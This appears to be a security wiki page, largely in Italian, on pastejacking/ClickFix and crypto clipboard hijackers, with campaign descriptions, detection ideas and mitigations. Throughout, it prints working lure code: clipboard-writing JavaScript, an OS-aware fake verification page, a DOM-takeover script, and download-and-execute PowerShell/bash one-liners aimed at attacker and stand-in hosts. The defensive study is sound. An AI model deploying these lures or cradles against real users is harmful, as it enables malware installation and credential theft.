# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – vecchio ma ancora valido consiglio

## Panoramica

Clipboard hijacking – noto anche come *pastejacking* – sfrutta il fatto che gli utenti copiano e incollano regolarmente comandi senza ispezionarli. Una pagina web malevola (o qualsiasi contesto con capacità JavaScript, come un'applicazione Electron o Desktop) inserisce programmaticamente testo controllato dall'attaccante nel system clipboard. Le vittime vengono incoraggiate, di solito tramite istruzioni di social-engineering accuratamente costruite, a premere **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), oppure ad aprire un terminale e *incollare* il contenuto del clipboard, eseguendo immediatamente comandi arbitrari.

Poiché **nessun file viene scaricato e nessun allegato viene aperto**, la tecnica aggira la maggior parte dei controlli di sicurezza e-mail e web-content che monitorano allegati, macro o esecuzione diretta di comandi. L'attacco è quindi diffuso nelle campagne di phishing che distribuiscono famiglie di malware comuni come NetSupport RAT, Latrodectus loader o Lumma Stealer.

## Sostituzione di indirizzi wallet con clippers

Un'altra variante di **clipboard hijacking** non incolla affatto comandi: attende finché la vittima copia un **indirizzo di wallet di criptovaluta**, poi lo sostituisce silenziosamente con uno controllato dall'attaccante poco prima dell'incolla. Questo è particolarmente efficace contro i formati lunghi di wallet perché gli utenti spesso verificano solo i primi/ultimi caratteri.

Caratteristiche comuni nel mondo reale:
- **Thin loader + nested payload**: l'app/exe visibile sembra uno strumento legittimo di trading o di "profit", mentre il vero clipper è nascosto più in profondità nel bundle (per esempio un .NET loader che avvia un nested Rust payload).
- **Sostituzione guidata da Regex**: il malware corrisponde a stringhe come `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, o persino stringhe generiche **alla Solana di 44 caratteri** e le riscrive con wallet dell'attaccante.
- **Rotazione dei wallet su larga scala**: i campioni Windows moderni possono incorporare **migliaia** di wallet di sostituzione per valuta invece di un singolo indirizzo statico, riducendo l'usura della reputazione del wallet dopo ogni furto.

### Flusso del clipper su Windows

Un'implementazione comune è una finestra nascosta registrata con **`AddClipboardFormatListener`**. A ogni aggiornamento del clipboard, il malware in genere chiama:
- **`OpenClipboard`** → accede ai dati correnti del clipboard.
- **`GetClipboardData`** → legge il testo.
- **`EmptyClipboard`** + **`SetClipboardData`** → sostituisce la stringa del wallet con il valore dell'attaccante.

Regex minime da hunting spesso viste nei clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
La persistenza a livello utente è sufficiente per l’impatto. Un pattern osservato è:
- Copiare il payload in **`%APPDATA%\silke\silke.exe`**
- Creare un **Startup-folder LNK** sotto `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Idee di detection:
- Processi che chiamano continuamente le clipboard APIs mentre scrivono anche sotto `%APPDATA%` e la cartella **Startup** dell’utente.
- Nuova creazione di LNK/executable seguita da riscritture della clipboard dell’indirizzo wallet.
- Archivi o bundle di finto software contenenti molti file inutilizzati più un piccolo launcher che avvia un nested binary.

### macOS social-engineered quarantine removal + LaunchAgent persistence

Su macOS, alcune campagne distribuiscono un helper **`unlocker.command`** e istruiscono la vittima a fare click destro → **Open** se Gatekeeper dice che l’app è danneggiata o proveniente da uno sviluppatore non identificato. Lo script rimuove semplicemente la quarantine e avvia il `.app` vicino:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** that abuses the fact that Gatekeeper decisions depend on the `com.apple.quarantine` xattr.

After execution, the clipper can persist as the current user by writing:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent with `RunAtLoad` and `KeepAlive`

A useful defensive detail is that some samples implement a **self-healing watchdog** that re-writes the LaunchAgent and wrapper every ~30 seconds. If you remove the plist first **without killing the running process**, the malware may recreate it immediately. Safe cleanup order:
1. Kill the active clipper process.
2. Unload/delete the LaunchAgent plist.
3. Delete `~/launch.sh` and the copied payload.

### Delivery note: fake reputation as a force multiplier

For this family, the malware itself can stay technically simple while the **distribution layer** does the heavy lifting: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, and benign-looking VirusTotal comments/votes are used to make the binary appear trustworthy before execution.

## Forced copy buttons and hidden payloads (macOS one-liners)

Some macOS infostealers clone installer sites (e.g., Homebrew) and **force use of a “Copy” button** so users cannot highlight only the visible text. The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> | base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Le campagne più vecchie usavano `document.execCommand('copy')`, quelle più recenti si basano sulla **Clipboard API** asincrona (`navigator.clipboard.writeText`).

## Il flusso ClickFix / ClearFake

1. L’utente visita un sito typosquatted o compromesso (ad es. `docusign.sa[.]com`)
2. Il JavaScript iniettato di **ClearFake** chiama un helper `unsecuredCopyToClipboard()` che memorizza silenziosamente negli appunti una one-liner di PowerShell codificata in Base64.
3. Le istruzioni HTML dicono alla vittima di: *“Premi **Win + R**, incolla il comando e premi Invio per risolvere il problema.”*
4. `powershell.exe` viene eseguito, scaricando un archivio che contiene un eseguibile legittimo più una DLL malevola (classico DLL sideloading).
5. Il loader decifra stage aggiuntivi, inietta shellcode e installa persistenza (ad es. scheduled task) – eseguendo infine NetSupport RAT / Latrodectus / Lumma Stealer.

### Esempio di catena NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legittimo Java WebStart) cerca nella sua directory `msvcp140.dll`.
* La DLL malevola risolve dinamicamente le API con **GetProcAddress**, scarica due binari (`data_3.bin`, `data_4.bin`) tramite **curl.exe**, li decritta usando una rolling XOR key `"https://google.com/"`, inietta il shellcode finale e decomprime **client32.exe** (NetSupport RAT) in `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Scarica `la.txt` con **curl.exe**
2. Esegue il downloader JScript dentro **cscript.exe**
3. Recupera un payload MSI → lascia cadere `libcef.dll` accanto a un'applicazione firmata → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La chiamata **mshta** avvia uno script PowerShell nascosto che recupera `PartyContinued.exe`, estrae `Boat.pst` (CAB), ricostruisce `AutoIt3.exe` tramite `extrac32` e concatenazione di file e infine esegue uno script `.a3x` che esfiltra le credenziali del browser verso `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Alcune campagne ClickFix saltano del tutto i download di file e istruiscono le vittime a incollare una one-liner che recupera ed esegue JavaScript tramite WSH, lo rende persistente e ruota il C2 ogni giorno. Esempio di catena osservata:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Tratti chiave
- URL offuscato invertito in runtime per aggirare un'ispezione superficiale.
- JavaScript si mantiene tramite un LNK di Startup (WScript/CScript) e seleziona il C2 in base al giorno corrente, abilitando una rapida rotazione dei domini.

Frammento JS minimale usato per ruotare i C2 in base alla data:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La fase successiva di solito distribuisce un loader che stabilisce la persistence e scarica un RAT (ad es., PureHVNC), spesso con TLS pinning su un certificato hardcoded e suddivisione del traffico in chunk.

Idee di rilevamento specifiche per questa variante
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (o `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` che invoca WScript/CScript con un path JS sotto `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU e telemetria della command-line contenenti `.split('').reverse().join('')` o `eval(a.responseText)`.
- Ripetuti `powershell -NoProfile -NonInteractive -Command -` con payload stdin di grandi dimensioni per alimentare script lunghi senza command line lunghe.
- Scheduled Tasks che successivamente eseguono LOLBins come `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sotto un task/path che sembra di un updater (ad es., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Hostname e URL C2 con rotazione giornaliera e pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlare eventi di scrittura della clipboard seguiti da paste con Win+R e poi esecuzione immediata di `powershell.exe`.


I Blue-team possono combinare telemetria di clipboard, creazione processi e registry per individuare l’abuso di pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` mantiene uno storico dei comandi di **Win + R** – cerca voci insolite in Base64 / offuscate.
* Security Event ID **4688** (Process Creation) dove `ParentImage` == `explorer.exe` e `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** per creazioni di file sotto `%LocalAppData%\Microsoft\Windows\WinX\` o cartelle temporanee subito prima del sospetto evento 4688.
* Sensori EDR della clipboard (se presenti) – correlare `Clipboard Write` seguito immediatamente da un nuovo processo PowerShell.

## Pagine di verifica stile IUAM (ClickFix Generator): copia della clipboard in console + payload consapevoli dell'OS

Campagne recenti producono in massa false pagine di verifica CDN/browser ("Just a moment…", stile IUAM) che costringono gli utenti a copiare dalla clipboard comandi specifici per OS nelle console native. Questo sposta l’esecuzione fuori dal sandbox del browser e funziona su Windows e macOS.

Caratteristiche chiave delle pagine generate dal builder
- Rilevamento OS via `navigator.userAgent` per adattare i payload (Windows PowerShell/CMD vs. macOS Terminal). Decoy/no-op opzionali per OS non supportati per mantenere l’illusione.
- Auto-copia nella clipboard su azioni UI innocue (checkbox/Copy) mentre il testo visibile può differire dal contenuto della clipboard.
- Blocco mobile e un popover con istruzioni passo-passo: Windows → Win+R→paste→Enter; macOS → apri Terminal→paste→Enter.
- Offuscamento opzionale e injector in un solo file per sovrascrivere il DOM di un sito compromesso con una UI di verifica in stile Tailwind (non richiede nuova registrazione di dominio).

Esempio: mismatch della clipboard + branching consapevole dell’OS
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Persistenza di macOS della prima esecuzione
- Usa `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` in modo che l'esecuzione continui dopo la chiusura del terminale, riducendo gli artefatti visibili.

Takeover della pagina in-place su siti compromessi
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
- Idee di detection & hunting specifiche per lure in stile IUAM
- Web: pagine che associano la Clipboard API a widget di verifica; mismatch tra il testo mostrato e il payload della clipboard; branching di `navigator.userAgent`; Tailwind + single-page replace in contesti sospetti.
- Endpoint Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` poco dopo un’interazione con il browser; installer batch/MSI eseguiti da `%TEMP%`.
- Endpoint macOS: Terminal/iTerm che avviano `bash`/`curl`/`base64 -d` con `nohup` in prossimità di eventi del browser; background jobs che sopravvivono alla chiusura del terminal.
- Correlare la cronologia `RunMRU` di Win+R e le scritture nella clipboard con la successiva creazione di processi da console.

Vedi anche le tecniche di supporto

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Evoluzioni 2026 di fake CAPTCHA / ClickFix (ClearFake, Scarlet Goldfinch)

- ClearFake continua a compromettere siti WordPress e a iniettare JavaScript loader che concatenano host esterni (Cloudflare Workers, GitHub/jsDelivr) e persino chiamate blockchain “etherhiding” (ad es. POST verso endpoint API di Binance Smart Chain come `bsc-testnet.drpc[.]org`) per recuperare la logica del lure corrente. I recenti overlay usano in modo intenso fake CAPTCHA che istruiscono gli utenti a copiare/incollare una one-liner (T1204.004) invece di scaricare qualcosa.
- L’esecuzione iniziale viene sempre più delegata a host di script firmati/LOLBAS. Le catene di gennaio 2026 hanno sostituito il precedente uso di `mshta` con il built-in `SyncAppvPublishingServer.vbs` eseguito tramite `WScript.exe`, passando argomenti in stile PowerShell con alias/wildcard per recuperare contenuto remoto:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` è firmato e normalmente usato da App-V; abbinato a `WScript.exe` e argomenti insoliti (`gal`/`gcm` aliases, cmdlet con wildcard, URL jsDelivr) diventa un stage LOLBAS ad alto segnale per ClearFake.
- I payload fake CAPTCHA di febbraio 2026 sono tornati a pure PowerShell download cradles. Due esempi live:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- La prima chain è un grabber in-memory `iex(irm ...)`; la seconda si stagera tramite `WinHttp.WinHttpRequest.5.1`, scrive un `.ps1` temporaneo, poi lo avvia con `-ep bypass` in una finestra nascosta.

Detection/hunting tips for these variants
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` oppure PowerShell cradles subito dopo scritture nel clipboard/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domini jsDelivr/GitHub/Cloudflare Worker, oppure pattern `iex(irm ...)` con raw IP.
- Network: outbound verso host CDN worker o endpoint RPC blockchain da script host/PowerShell subito dopo la navigazione web.
- File/registry: creazione temporanea di `.ps1` sotto `%TEMP%` più voci RunMRU contenenti queste one-liner; block/alert su signed-script LOLBAS (WScript/cscript/mshta) in esecuzione con URL esterni o stringhe alias offuscate.

## Mitigations

1. Browser hardening – disabilita l’accesso in scrittura al clipboard (`dom.events.asyncClipboard.clipboardItem` etc.) oppure richiedi un gesto dell’utente.
2. Security awareness – insegna agli utenti a *digitare* i comandi sensibili o a incollarli prima in un editor di testo.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control per bloccare one-liner arbitrari.
4. Network controls – blocca le richieste outbound verso domini noti di pastejacking e malware C2.

## Related Tricks

* **Discord Invite Hijacking** spesso abusa dello stesso approccio ClickFix dopo aver attirato gli utenti in un server malevolo:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
